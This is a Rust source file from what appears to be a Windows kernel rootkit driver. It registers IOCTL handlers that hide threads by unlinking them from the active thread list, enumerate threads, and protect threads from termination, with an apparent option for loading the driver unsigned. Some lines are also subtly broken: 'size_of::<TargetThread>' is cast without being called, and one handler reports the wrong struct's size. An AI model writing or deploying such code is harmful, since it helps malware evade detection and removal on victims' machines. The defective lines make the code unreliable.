use {
    core::mem::size_of,
    alloc::boxed::Box,
    hashbrown::HashMap,
    shared::{
        ioctls::{IOCTL_ENUMERATION_THREAD, IOCTL_HIDE_UNHIDE_THREAD, IOCTL_PROTECTION_THREAD}, 
        structs::{EnumerateInfoInput, TargetThread, ThreadListInfo}
    },
    wdk_sys::{IO_STACK_LOCATION, IRP},
    crate::{handle_thread, thread::Thread, utils::ioctls::IoctlHandler},
};

#[cfg(not(feature = "mapper"))]
use {
    crate::thread::add_remove_thread_toggle,
    shared::structs::ThreadProtection,
};

pub fn get_thread_ioctls(ioctls: &mut HashMap<u32, IoctlHandler>) {

    // Hide the specified Thread by removing it from the list of active threads.
    ioctls.insert(IOCTL_HIDE_UNHIDE_THREAD, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
        log::info!("Received IOCTL_HIDE_UNHIDE_THREAD");
        let status = unsafe { handle_thread!(stack, Thread::thread_toggle, TargetThread) };
        unsafe { (*irp).IoStatus.Information = size_of::<TargetThread> as u64 };
        status
    }) as IoctlHandler);

    // ?
    ioctls.insert(IOCTL_ENUMERATION_THREAD, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
        log::info!("Received IOCTL_ENUMERATION_THREAD");
        let mut information = 0;
        let status = unsafe { handle_thread!(irp, stack, Thread::enumerate_thread_toggle, EnumerateInfoInput, ThreadListInfo , &mut information) };
        unsafe { (*irp).IoStatus.Information = information as u64 };
        status
    }) as IoctlHandler);

    // Responsible for adding thread termination protection.
    ioctls.insert(IOCTL_PROTECTION_THREAD, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
        log::info!("Received IOCTL_PROTECTION_THREAD");
        let status = unsafe { handle_thread!(stack, add_remove_thread_toggle, ThreadProtection) };
        unsafe { (*irp).IoStatus.Information = size_of::<TargetThread> as u64 };
        status
    }) as IoctlHandler);
}